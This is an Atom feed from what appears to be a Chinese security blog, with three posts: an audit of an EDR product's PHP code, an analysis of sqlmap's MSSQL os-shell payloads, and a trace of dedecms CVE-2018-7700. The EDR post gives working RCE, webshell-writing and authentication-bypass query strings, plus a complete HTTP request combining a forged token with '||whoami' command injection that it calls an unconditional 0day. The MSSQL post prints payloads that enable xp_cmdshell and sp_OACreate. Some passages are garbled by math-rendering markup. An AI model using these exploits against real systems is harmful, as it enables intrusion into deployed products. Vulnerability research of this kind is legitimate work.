<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://chriskalix.github.io</id>
    <title>chriskali&apos;s blog</title>
    <updated>2020-08-28T01:44:22.299Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://chriskalix.github.io"/>
    <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
    <subtitle>Keep learning</subtitle>
    <logo>https://chriskalix.github.io/images/avatar.png</logo>
    <icon>https://chriskalix.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[某edr实战分析]]></title>
        <id>https://chriskalix.github.io/post/QpDpOlp0Y/</id>
        <link href="https://chriskalix.github.io/post/QpDpOlp0Y/">
        </link>
        <updated>2020-08-28T01:41:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="某edr分析">某edr分析</h1>
<blockquote>
<p>近期某edr的洞小火了一把，有幸分析一下，仅供参考。看了宽字节的文章，其实还有很多这种，但是很多都是有前置判断的，虽然代码不行，但是确实大部分都不是直接能从前台开始执行的</p>
</blockquote>
<blockquote>
<p>官方的修复方法即为删除了 tool 和 store 目录 （也行，挺彻底的）</p>
</blockquote>
<h2 id="rce">RCE</h2>
<p>这里基本都是同样的套路，extract变量覆盖直接执行</p>
<h3 id="0x01-rce-1">0x01 RCE - 1</h3>
<p>这个也是最先被爆出来的RCE点，其实非常简单，很快就能找出执行点。该执行点在 <code>tool/c.php</code> 下，入口点函数为</p>
<pre><code class="language-php">$show_form($_REQUEST);
</code></pre>
<p>跟进后</p>
<pre><code class="language-php">$show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) {
    extract($params);
    $host  = isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;
    $path  = isset($path)  ? $strip_slashes($path)  : &quot;&quot;;
    $row   = isset($row)   ? $strip_slashes($row)   : &quot;&quot;;
    $limit = isset($limit) ? $strip_slashes($limit) : 1000;
    echo &quot;&lt;pre&gt;&quot;;
    echo '&lt;form id=&quot;studio&quot; name=&quot;studio&quot; method=&quot;post&quot; action=&quot;&quot;&gt;';
    $show_input(array(&quot;title&quot; =&gt; &quot;Host &quot;,  &quot;name&quot; =&gt; &quot;host&quot;,  &quot;value&quot; =&gt; $host,  &quot;note&quot; =&gt; &quot; - host, e.g. 127.0.0.1&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Path &quot;,  &quot;name&quot; =&gt; &quot;path&quot;,  &quot;value&quot; =&gt; $path,  &quot;note&quot; =&gt; &quot; - path regex, e.g. mapreduce&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Row  &quot;,  &quot;name&quot; =&gt; &quot;row&quot;,   &quot;value&quot; =&gt; $row,   &quot;note&quot; =&gt; &quot; - row regex, e.g. \s[w|e]\s&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Limit&quot;,  &quot;name&quot; =&gt; &quot;limit&quot;, &quot;value&quot; =&gt; $limit, &quot;note&quot; =&gt; &quot; - top n, e.g. 100&quot;));
    echo '&lt;input type=&quot;submit&quot; id=&quot;button&quot;&gt;';
    echo '&lt;/form&gt;';
    echo &quot;&lt;/pre&gt;&quot;;
};
</code></pre>
<p>......一步就到位了，所以截图里面的参数为 <code>?strip_slashes=system&amp;host=id</code> ，第二个参数(host)可以改成path,row,limit都可以(这个也太简单了...)</p>
<h3 id="0x02-rce-2bad">0x02 RCE - 2(BAD)</h3>
<p>有些代码没加载进来，所以注释了上面的一部分，不影响。这次找到的是，同个样子的。搜寻的思路就是既然能写出上述代码，肯定不止一处。所以在 <code>tool/mdd_sql.php</code> 下又有一处 rce，熟悉的入口点</p>
<pre><code class="language-php">$show_form($_REQUEST);
</code></pre>
<p>熟悉的跟进函数</p>
<pre><code class="language-php">$show_form = function($params) 
    use(&amp;$strip_slashes, &amp;$show_input, &amp;$show_radio, &amp;$show_text) {
    extract($params);
    $root = isset($root) ? $strip_slashes($root) : &quot;&quot;;
    $sql  = isset($sql) ? $strip_slashes($sql) : &quot;&quot;;
    $limit = isset($limit) ? $strip_slashes($limit) : &quot;1000&quot;;
    $output = isset($output) ? $strip_slashes($output) : &quot;&quot;;
    $console = isset($console) ? $strip_slashes($console) : &quot;off&quot;;
    $mdd = isset($mdd) ? $strip_slashes($mdd) : &quot;off&quot;;

    // 绘制表单
    echo '&lt;form id=&quot;studio&quot; name=&quot;studio&quot; method=&quot;post&quot; action=&quot;&quot;&gt;';
    $show_radio(&quot;console&quot;, &quot;Console&quot;, array(&quot;on&quot; =&gt; &quot;on&quot;, &quot;off&quot; =&gt; &quot;off&quot;), &quot; - run as console mode&quot;, $console);
    $show_radio(&quot;mdd&quot;,     &quot;Mdd    &quot;, array(&quot;on&quot; =&gt; &quot;on&quot;, &quot;off&quot; =&gt; &quot;off&quot;), &quot; - 仅获取结果集分区路径&quot;, $mdd);
    $show_input(array(&quot;title&quot; =&gt; &quot;Limit&quot;, &quot;name&quot; =&gt; &quot;limit&quot;, &quot;value&quot; =&gt; $limit, &quot;note&quot; =&gt; &quot; - 最终作业结果集条数&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Output&quot;, &quot;name&quot; =&gt; &quot;output&quot;, &quot;value&quot; =&gt; $output, &quot;note&quot; =&gt; &quot; - 指定输出结果集的作业，多个作业使用\&quot;,\&quot;分隔&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Root&quot;, &quot;name&quot; =&gt; &quot;root&quot;, &quot;value&quot; =&gt; $root, &quot;note&quot; =&gt; &quot; - 根路径，默认空则使用内置数据集&quot;));        
    $show_text(array(&quot;title&quot; =&gt; &quot;SQL&quot;, &quot;name&quot; =&gt; &quot;sql&quot;, &quot;value&quot; =&gt; $sql, &quot;note&quot; =&gt; &quot; - SQL&quot;));
    echo '&lt;input type=&quot;submit&quot; id=&quot;button&quot;&gt; ';
    echo '&lt;/form&gt;';
    echo &quot;\n&quot;;
};
</code></pre>
<p>所以poc也是简单的 <code>?strip_slashes=system&amp;root=whoami</code> ，这个root同理也是可以替换的，替换成sql,limit,output,console都可以</p>
<h3 id="0x03-rce-3bad">0x03 RCE - 3(BAD)</h3>
<p>熟悉的配方，熟悉的味道，在同个文件 <code>tool/mdd_sql.php</code> 下还是有，入口点</p>
<pre><code class="language-php">$main($_REQUEST);
</code></pre>
<p>跟进，熟悉的变量覆盖执行</p>
<pre><code class="language-php">$main = function($argv)
    use(&amp;$time, &amp;$eval) {
    global $ldb_has_console;
    extract($argv);
    if (!isset($sql) || !isset($root)) {
        return;
    }
    $sql = $eval($sql);
    if (isset($console)) {
        $ldb_has_console = ($console == &quot;on&quot;);
    }
......
</code></pre>
<p>所以 poc 为 <code>?sql=whoami&amp;root=123&amp;eval=system</code> ，其中root有值就行</p>
<h3 id="0x04-rce-4bad">0x04 RCE - 4(BAD)</h3>
<p>这里其实有预判断的</p>
<pre><code class="language-php">$dc_tool_flag = ldb_ext_root().&quot;/php/enable_dc_tool&quot;;
if (!file_exists($dc_tool_flag)) {
    die;
}
</code></pre>
<p>ldb_ext_root这个函数没有，所以猜测是代码脱下来的问题8....<br>
跳过这个函数先不看，直接看入口+执行</p>
<pre><code class="language-php">$main = function($argv) {
    extract($argv);
    if (!isset($code)) {
        return;
    }
    eval($code);
};

set_time_limit(0);
echo '&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; Content=&quot;text/html; Charset=gb2312&quot;&gt;&lt;/head&gt;';
echo '&lt;body bgcolor=&quot;#e8ddcb&quot;&gt;';
echo &quot;&lt;p&gt;&lt;b&gt;PHP Code Eval&lt;/b&gt;&lt;/p&gt;&quot;;
$show_form($_REQUEST);
echo &quot;&lt;pre&gt;&quot;;
$main($_REQUEST);
echo &quot;&lt;/pre&gt;&quot;;  
</code></pre>
<p>一样的，直接传入 code 即可，直接就执行了 poc 为 <code>?code=phpinfo();</code></p>
<h2 id="getshell">Getshell</h2>
<h3 id="0x01-getshell-1">0x01 Getshell - 1</h3>
<p>同样的是变量覆盖的问题，不过这里的变量有点多，文件为<code>/tool/c.php</code></p>
<p>入口点</p>
<pre><code class="language-php">$main($_REQUEST);
</code></pre>
<p>跟进</p>
<pre><code class="language-php">$main = function($argv) 
    use(&amp;$collect) {
    extract($argv);
    if (!isset($limit)) {
        return;
    }
    $result = $collect($path, $row, $limit, $host);
    if (!is_array($result)) {
        echo $result, &quot;\n&quot;;
        return;
    }
    if (!isset($result[&quot;success&quot;]) || $result[&quot;success&quot;] !== true) {
        echo $result, &quot;\n&quot;;
        return;
    }
    foreach ($result[&quot;data&quot;] as $host =&gt; $items) {
        $last = &quot;&quot;;
        foreach ($items as $item) {
            if ($item[&quot;name&quot;] != $last) {
                $last = $item[&quot;name&quot;];
                echo &quot;\n[$host] -&gt; $last\n\n&quot;;
            }
            echo $item[&quot;item&quot;], &quot;\n&quot;;
        }
    }
};
</code></pre>
<p>这里传参太多了，本来想用proc_exec，但是捣鼓了一下没搞成。曲线救国，直接写shell吧。<br>
poc为 <code>?collect=file_put_contents&amp;path=test.php&amp;row=&lt;?php+phpinfo();?&gt;&amp;limit=0</code><br>
写了test.php，访问后会生成<br>
<img src="https://chriskalix.github.io/post-images/1598578919297.png" alt="" loading="lazy"></p>
<h2 id="风险点">风险点</h2>
<p>这个代表不是通杀，可能为异常</p>
<h3 id="0x01-admin登录">0x01 Admin登录</h3>
<p>昨晚（20200819）有爆出来说 <code>/ui/login</code> 存在admin登录绕过问题，其实那个代码已经看过了，展示一下，部分如下</p>
<pre><code class="language-php">function check_free_loginbyscl()
{
    //免密条件
    //***、SCL分支端127.0.0.2 （代理配置只能有127.0.0.2进入到这） Jim
    //soc 通过bbc通道后代理ip是172.0.0.1
    $docker = false;
    if(isset($_COOKIE[&quot;scl_session&quot;]) &amp;&amp; isset($_COOKIE[&quot;username&quot;])){
        $check = $_COOKIE[&quot;scl_session&quot;];
        $username = $_COOKIE[&quot;username&quot;];
    }
    if(file_exists(getenv(&quot;EPS_INSTALL_ROOT&quot;) . &quot;config/docker.ini&quot;)){
        $ini_content = parse_ini_file(getenv(&quot;EPS_INSTALL_ROOT&quot;) . &quot;config/docker.ini&quot;, true);
    }
    if(isset($ini_content[$username][&quot;scl_session&quot;]) &amp;&amp; $ini_content[$username][&quot;scl_session&quot;] == $check){
        $docker = true;
    }
    if((isset($_SERVER[&quot;REMOTE_ADDR&quot;]) &amp;&amp; (&quot;127.0.0.2&quot; == $_SERVER[&quot;REMOTE_ADDR&quot;] || &quot;127.0.0.1&quot; == $_SERVER[&quot;REMOTE_ADDR&quot;]))
        || $docker)
    {
        //构造session
        if(isset($_GET[&quot;user&quot;]))
        {
            $auth_value[&quot;auth_user&quot;] = $_GET[&quot;user&quot;];
        }
        elseif($docker)
        {
            $auth_value[&quot;auth_user&quot;] = $username;
        }
        else
        {
            //$auth_value[&quot;auth_user&quot;] = &quot;SCLOUDE&quot;;
            //免密登录后，人为loginout，还是需要密码登录，url不一样
            return;
        }
</code></pre>
<p>因为全局搜入口的时候已经看到这里了，当时稍微看了一下，没想到<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>可能被做反向代理的情况。当然后来key仔也说了，这个只有在配置不当的情况下才有可能存在漏洞。这个的poc为<code>?user=admin</code> 。判断条件就是REMOTE_ADDR是否为127.0.0.1或者127.0.0.2或者是在$docker里。</p>
<h1 id="分界线-ovf实例分析">分界线 - ovf实例分析</h1>
<blockquote>
<p>由于第一次拿到的是部分代码，有些地方没法跟进调试，如今拿到了0703版本的ovf虚拟机，装上后重新调试分析。提及一下，上述的风险点默认是没有的。</p>
</blockquote>
<h2 id="蜈蚣一号-权限绕过">蜈蚣一号 - 权限绕过</h2>
<p>这个不是我审计的，是keykey审计出来的，看完之后我反思了一下自己的错误点。</p>
<ol>
<li>不够细心</li>
<li>对百度查出的结果过于信任，没有自己去细究原理</li>
</ol>
<h3 id="入口点">入口点</h3>
<p>由于输入的可控点较少（尤其是更新后剔除了 tool 目录以及 store 目录），在vscode里正则匹配输入源 <code>\$_(REQUEST|POST|GET)</code> 很快就能找到。其中觉得有戏的是 <code>divideUploader.php</code> 这个文件<br>
<img src="https://chriskalix.github.io/post-images/1598578932792.png" alt="" loading="lazy"></p>
<p>可以看到做了权限预认证，才能去触发，我们接着跟进</p>
<h3 id="跟进函数">跟进函数</h3>
<p>全局搜索$auto_auth_check，在auth.php的796行被定义，ldb开头的两个函数可以跟进去，其实都是固定值，一个从文件读取，一个判断是否为命令行执行<br>
<img src="https://chriskalix.github.io/post-images/1598578981520.png" alt="" loading="lazy"></p>
<p>所以跟进$super_ip_check进行查看</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1598578987970.png" alt="" loading="lazy"></figure>
<p>看到先调用$get_user_ip，我们连续跟进查看调用</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1598578994074.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1598579001993.png" alt="" loading="lazy"></figure>
<p>可以看到其实就是从os.json文件里读出特权IP，但是默认情况下是没有特权IP的。那么我们重新回到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>u</mi><mi>p</mi><mi>e</mi><msub><mi>r</mi><mi>i</mi></msub><msub><mi>p</mi><mi>c</mi></msub><mi>h</mi><mi>e</mi><mi>c</mi><mi>k</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">逻</mi><mi mathvariant="normal">辑</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">坑</mi><mi mathvariant="normal">点</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">去</mi><mi mathvariant="normal">搜</mi><mi mathvariant="normal">索</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">super_ip_check的逻辑里，这里就是我坑点的地方了。我去搜索了 `</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逻</span><span class="mord cjk_fallback">辑</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">坑</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">搜</span><span class="mord cjk_fallback">索</span><span class="mord cjk_fallback">了</span><span class="mord">‘</span></span></span></span>_SERVER['HTTP_Y_FORWARDED_FOR']` (没见过，一般都是X)，快速发现说是Nginx自动配置......于是我跳过了这个地方。而实际上，这个地方是可控的<br>
翻阅了2分钟的文档没有发现，于是自己实验了一下。$_SERVER中HTTP_开头的键值是从请求报文里面截取的，即为攻击者可控数据。随便实验了一下<br>
<img src="https://chriskalix.github.io/post-images/1598579008986.png" alt="" loading="lazy"></p>
<p>那么思路很明确了，只要自定义一个头 Y_FORWARDED_FOR 为空，即可被判定为 super_ip 绕过权限验证。这里加入头 Y-Forwarded-For即可。但是这里我的是3.2.21版本，已经修复了，所以不能使用，进一步分析可以看Neo攻防组的文章，我就不做搬运工了</p>
<h2 id="二号-无条件rce-0day">二号 - 无条件RCE - 0day</h2>
<p>首先cssp有个token预校验，代码如下<br>
<code>dev_linkage_launch.php</code></p>
<pre><code class="language-php">function check_access_token($access_token, $req_url){

    // token base64解码
    $token_str = base64_decode($access_token);

    // json_decode一下
    $json_token = json_decode($token_str, true);
    $key = get_item_from_os_json(&quot;privateKey&quot;);
    if($key == &quot;&quot; &amp;&amp; $req_url == STD_CSSP_DOWN_CONF_URL) {
        $key = STD_CSSP_DEFAULT_KEY;
    }
    $md5_str = md5($key.$json_token[&quot;random&quot;]);
    if($md5_str == $json_token[&quot;md5&quot;]) {
        return 0;
    }

    ldb_error(&quot;check token failed&quot;);
    return 1;
}
</code></pre>
<p>这里直接构造即可</p>
<pre><code class="language-php">&lt;?php
$a = '{&quot;random&quot;:&quot;1&quot;,&quot;md5&quot;:&quot;c4ca4238a0b923820dcc509a6f75849b&quot;}';
echo(base64_encode($a));
?&gt;
</code></pre>
<p>即可输出正确的token值</p>
<pre><code class="language-php">$exec_slog_action = function($object,$params){
    $data = $params[&quot;data&quot;];
    var_dump($data[&quot;params&quot;]);

    if (!isset($data[&quot;params&quot;])) {
        ldb_error(&quot;required parameter missing params is&quot;.json_encode($params));
        $object-&gt;err_code = EXEC_SLOG_ACTION_PARAM_ERROR;
        return -1;
    }

    $data[&quot;params&quot;] = ldb_mapreduce_invoke(&quot;call_method&quot;, &quot;app.web.common.validation.shell_injection_check&quot;,
        &quot;shell_argv_transform&quot;, $data[&quot;params&quot;]);

    $command = &quot;curl -k 'http://127.0.0.1:9081/?&quot;.$data[&quot;params&quot;].&quot;'&quot;;
    var_dump($command);
    ldb_debug(&quot;exec command: &quot;.$command);
    ldb_exec($command, $output, $ret);
    if ($ret !== 0) {
        ldb_error(&quot;exec slog action fail, command: $command, error: &quot;.$output);
        $object-&gt;err_code = EXEC_SLOG_ACTION_FAILED;
        return -1;
    }

    $data = $output;
    response_linkage_dev_msg(SUCCESS,$data);
    return 0;
};
</code></pre>
<p>这里的代码逻辑是先要去 shell_argv_transform 过滤一下，其实就是 escapeshellarg。先去查了一下绕过的文章，看了2分钟云里雾里，直接上手。发现其实就是添加单引号，但是 || 可以逃逸<br>
那么最终的报文就如此简单</p>
<pre><code class="language-http">POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJyYW5kb20iOiIxIiwibWQ1IjoiYzRjYTQyMzhhMGI5MjM4MjBkY2M1MDlhNmY3NTg0OWIifQ== HTTP/1.1
Host: 192.168.244.199
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 52
Content-Type: application/json;charset=UTF-8

{
	&quot;opr&quot;:&quot;exec_slog_action&quot;,
	&quot;params&quot;:&quot; ||whoami&quot;
}
</code></pre>
<p>截图如下<br>
<img src="https://chriskalix.github.io/post-images/1598579017876.png" alt="" loading="lazy"></p>
<p>后来key仔跟说我opr其实不用赋值的，我看了看逻辑好像是这样滴...<br>
为什么会有这样的问题？这应该本身只是一个正常的ping功能，开发认为用了 <code>escapeshellarg</code> 就可以规避注入的问题，实际上 || 就逃逸出来了</p>
<h1 id="整理">整理</h1>
<h2 id="危险函数">危险函数</h2>
<p>ldb_exec<br>
ldb_mklink</p>
<h2 id="危险点跟踪">危险点跟踪</h2>
<h3 id="webbatch_pushbatch_cmdphp">/web/batch_push/batch_cmd.php</h3>
<p>追溯后没有直接调用</p>
<h3 id="webreport_centerreport_centerphp">/web/report_center/report_center.php</h3>
<p>比对失败</p>
<h3 id="linkage_managephp">linkage_manage.php</h3>
<p>失败</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[老生常谈之Mssql注入]]></title>
        <id>https://chriskalix.github.io/post/O9BI689Eo/</id>
        <link href="https://chriskalix.github.io/post/O9BI689Eo/">
        </link>
        <updated>2020-08-15T14:47:12.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>注入，老话题了。但是实战中碰到时往往草草带过，稍一深入就要露馅了，基本功不扎实不行，趁热打铁，立刻补上</p>
</blockquote>
<h2 id="环境">环境</h2>
<blockquote>
<p>环境的安装是比较头疼的，也没啥好说的，直接搜索搭建就完事了</p>
</blockquote>
<p>sqlserver 2014<br>
win10<br>
php5.2.17</p>
<h2 id="sqlmap行为分析">SQLmap行为分析</h2>
<blockquote>
<p>这里使用的方法是sqlmap，然后流量代理至本地burpsuite进行流量分析</p>
</blockquote>
<h3 id="普通判断">普通判断</h3>
<p>首先，SQLmap会预先判断数据库，当判断完毕后，需要选择<br>
<img src="https://chriskalix.github.io/post-images/1597507430917.png" alt="" loading="lazy"><br>
这时候看一下sqlmap发了什么数据。首先总共发送了6个数据包，因为之前预先读过一小部分的sqlmap源码，但是由于实在是太大（我太懒），所以用半猜测半推断的方式进行分析<br>
<img src="https://chriskalix.github.io/post-images/1597507581479.png" alt="" loading="lazy"><br>
首先会发送一个预先判断的数据包，应该是判断是否存在WAF<br>
<img src="https://chriskalix.github.io/post-images/1597507626390.png" alt="" loading="lazy"><br>
之后通过两个数据包，猜测通过判断返回包的关键字判断了为mssql，之后的数据包太多了，我还是口述一下。默认的technique是全部的BEUSTQ，在尝试了所有注入类型后，Sqlmap给出结果。<br>
<img src="https://chriskalix.github.io/post-images/1597507917353.png" alt="" loading="lazy"><br>
即报错型，时间布尔型，堆叠注入都可以</p>
<h3 id="关键的os-shell">关键的OS-shell</h3>
<blockquote>
<p>SQLmap中Os-shell的方式，之前在mysql中已经做过了解。先知中的<a href="https://xz.aliyun.com/t/7942">这篇文章</a>没有提到sqlserver怎么从注入点os-shell的，一时尴尬的我不知如何是好...</p>
</blockquote>
<p>首先，先发了4个包，剔除探活的就是3个<br>
<img src="https://chriskalix.github.io/post-images/1597508231666.png" alt="" loading="lazy"><br>
前面两个应该为报错型的数据，所以直接看最后的一个数据包<br>
<img src="https://chriskalix.github.io/post-images/1597508739304.png" alt="" loading="lazy"><br>
在返回中提示了xp_cmdshell插件没有开启，同时sqlmap也提示是否要重新启用该组件，之后的payload为如下所示，共有四个（剔除了校验xp_cmdshell是否开启的数据包）<br>
包1，尝试直接开启xp_cmdshell，失败（语法错误</p>
<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE-- HTTP/1.1
</code></pre>
<p>包2，把xp_cmdshell关了</p>
<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',0; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
</code></pre>
<p>包3，启用<code>ole automation procedures</code>，语法错误</p>
<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'ole automation procedures',1; RECONFIGURE WITH OVERRIDE--
</code></pre>
<p>包4，用sp_OACreate创建xp_cmdshell</p>
<pre><code>test');DECLARE @hpzy nvarchar(999); SET @hpzy='CREATE PROCEDURE new_xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int EXEC sp_OACreate ''WScript.Shell'',@ID OUT EXEC sp_OAMethod @ID,''Run'',Null,@cmd,0,1 EXEC sp_OADestroy @ID'; EXEC master..sp_executesql @hpzy;RECONFIGURE WITH OVERRIDE--
</code></pre>
<p>上面一顿操作后，os-shell的结果是失败的（使用的是Error-based注入，那么time-based是否不一样呢？答：其实也是用xp_cmdshell，只是time-based建立了一个临时表，然后把xp_cmdshell的结果写道临时表里面，再读取出来。为什么出错了呢？猜测因为代码写的是query。<br>
这里刚开始看的时候比较好奇，都已经sp_OAcreate了，为什么不直接执行命令就行了呢？后来发现这样执行其实是没有回显的......</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[dedecms老洞分析之 - CVE-2018-7700]]></title>
        <id>https://chriskalix.github.io/post/8IizO54vS/</id>
        <link href="https://chriskalix.github.io/post/8IizO54vS/">
        </link>
        <updated>2020-08-14T07:47:33.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>dedecms是比较经典的cms。当我第一次打开它的源码的时候我有点震惊(一个目录下好多PHP<br>
<img src="https://chriskalix.github.io/post-images/1597391332229.png" alt="" loading="lazy"></p>
</blockquote>
<p>回归正题，下面开始分析</p>
<h2 id="代码层面漏洞分析">代码层面漏洞分析</h2>
<blockquote>
<p>该漏洞为后台RCE，所以先登录后台进行后续操作</p>
</blockquote>
<h2 id="漏洞入口点">漏洞入口点</h2>
<p>入口点在 <code>tag_test_action.php</code> 函数中</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1597391385755.png" alt="" loading="lazy"></figure>
<p>这里有个预判断，就是 <code>csrf_check()</code> ，跟进这个函数，在 <code>config.php</code></p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1597391393119.png" alt="" loading="lazy"></figure>
<p>global <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">直</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">从</mi></mrow><annotation encoding="application/x-tex">token是直接从</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">从</span></span></span></span>GLOBALS里面取值，那么只要传递token参数即可。因为<code>$_SESSION['token']</code>是不存在的，为NULL，即只要传入 <code>?token=</code> 即可绕过该判断</p>
<h2 id="漏洞长链">漏洞长链</h2>
<p>绕过之后继续跟进tag_test_action.php，new了一个对象，所以预先调用 <code>__construct</code></p>
<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1597391398578.png" alt="" loading="lazy"></figure>
<p>走到<code>setTemplet</code> 函数跟进（在<code>arc.partview.class</code>中</p>
<figure data-type="image" tabindex="4"><img src="https://chriskalix.github.io/post-images/1597391404105.png" alt="" loading="lazy"></figure>
<p>所以 <code>$this-&gt;dtp-&gt;LoadSource()</code> 即调用 <code>DedeTagParse</code> 里的 <code>LoadSource</code> 方法</p>
<figure data-type="image" tabindex="5"><img src="https://chriskalix.github.io/post-images/1597391408624.png" alt="" loading="lazy"></figure>
<p>文件写入后调用 <code>LoadTemplate</code> 方法，继续跟进</p>
<figure data-type="image" tabindex="6"><img src="https://chriskalix.github.io/post-images/1597391412119.png" alt="" loading="lazy"></figure>
<p>跟进else，while部分为文件读取，跟进下面部分的 <code>LoadCache</code>， 截取部分关键</p>
<figure data-type="image" tabindex="7"><img src="https://chriskalix.github.io/post-images/1597391416214.png" alt="" loading="lazy"></figure>
<p>最后回到起初的<code>tag_test_action.php</code>，调用 <code>Display()</code>，继续跟进display</p>
<figure data-type="image" tabindex="8"><img src="https://chriskalix.github.io/post-images/1597391420423.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://chriskalix.github.io/post-images/1597391425587.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://chriskalix.github.io/post-images/1597391429782.png" alt="" loading="lazy"></figure>
<p>调用AssignSysTag()，继续跟进，剔除前面读取和循环部分</p>
<figure data-type="image" tabindex="11"><img src="https://chriskalix.github.io/post-images/1597391437221.png" alt="" loading="lazy"></figure>
<h2 id="漏洞触发点">漏洞触发点</h2>
<p>跟到最后执行函数的RunPHP，很经典的一个<code>@eval</code></p>
<figure data-type="image" tabindex="12"><img src="https://chriskalix.github.io/post-images/1597391441512.png" alt="" loading="lazy"></figure>
<h2 id="整体逻辑图">整体逻辑图</h2>
<figure data-type="image" tabindex="13"><img src="https://chriskalix.github.io/post-images/1597391448530.jpg" alt="" loading="lazy"></figure>
<h2 id="exp">EXP</h2>
